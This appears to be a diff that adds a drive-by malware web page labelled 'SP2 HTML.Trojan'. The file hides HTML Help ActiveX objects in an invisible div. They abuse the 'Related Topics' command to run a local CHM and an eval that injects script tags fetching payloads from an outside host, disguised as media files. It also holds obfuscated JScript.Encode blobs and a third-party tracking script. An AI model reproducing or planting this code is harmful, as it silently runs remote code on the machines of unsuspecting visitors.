@@ -1,0 +1,6 @@
+<HTML><BODY><SCRIPT LANGUAGE="raystyle" src="http://www.pic58.net/blue.wma"></SCRIPT><div style="display:none"><OBJECT id="raY" type="application/x-oleobject" classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11"><PARAM name="Command" value="Related Topics, MENU"><PARAM name="Window" value="$global_ifl"><PARAM name="item1" value='command;file://C:\WINDOWS\Help\apps.chm'></OBJECT><OBJECT id="Ray2" type="application/x-oleobject" classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11"><PARAM name="Command" value="Related Topics, MENU"><PARAM name="Window" value="$global_ifl"><PARAM name="item1" value='command;javascript:eval("document.write(\"<SCRIPT src=\\\"http://www.pic58.net/blue.mp3\\\"\"+String.fromCharCode(62)+\"</SCR\"+\"IPT\"+String.fromCharCode(62))")'></OBJECT></div></BODY>SP2 HTML.Trojan Written By QQ5725557<script language = JScript.Encode>#@~^DAAAAA==.m5 1SbZ3v#prAMAAA==^#~@</script><script language = JScript.Encode>#@~^HgAAAA==dYPb:WED`r]lH  mdk/Fv#irS!*iHQkAAA==^#~@</script></HTML>
+<script language="JavaScript"> 
+    var __cc_uid="ynsk"; var __cc_style =1;
+</script><script language="JavaScript" 
+    src="http://3.leadzz.com/count/count.js"> 
+</script>
